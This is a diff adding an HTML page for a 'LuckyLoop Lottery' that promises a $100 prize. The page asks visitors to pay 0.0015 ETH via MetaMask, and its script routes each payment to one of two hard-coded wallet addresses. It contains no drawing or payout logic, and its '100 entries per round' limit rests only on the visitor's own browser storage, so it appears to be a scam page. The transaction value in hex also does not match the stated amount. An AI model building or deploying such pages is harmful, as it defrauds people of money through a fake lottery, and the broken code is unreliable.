@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>LuckyLoop Lottery</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f7f7f7; }
+    h1 { color: #444; }
+    button { padding: 12px 20px; font-size: 16px; }
+    input { padding: 10px; font-size: 16px; width: 300px; }
+    .container { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome to LuckyLoop</h1>
+    <p>Enter for a chance to win $100! Only 100 entries per round.</p>
+    <button onclick="enterLottery()">Enter Now (0.0015 ETH)</button>
+    <p id="status"></p>
+    <script>
+      const walletA = "0x7102a550B0EcbBCbD289630Cd560189B44674192"; // First 30 entries
+      const walletB = "0x31Bd345293BB862A913935551ce0a0101efE5194"; // Next 70 entries
+
+      async function enterLottery() {
+        if (typeof window.ethereum === 'undefined') {
+          document.getElementById('status').innerText = 'MetaMask is not installed.';
+          return;
+        }
+
+        const [account] = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        const count = parseInt(localStorage.getItem('entryCount') || '0');
+        const toAddress = count < 30 ? walletA : walletB;
+
+        const tx = {
+          from: account,
+          to: toAddress,
+          value: '0x5391B7000000' // 0.0015 ETH in hex
+        };
+
+        try {
+          const result = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx],
+          });
+          localStorage.setItem('entryCount', (count + 1).toString());
+          document.getElementById('status').innerText = 'Entry submitted! Tx: ' + result;
+        } catch (err) {
+          document.getElementById('status').innerText = 'Error: ' + err.message;
+        }
+      }
+    </script>
+  </div>
+</body>
+</html>
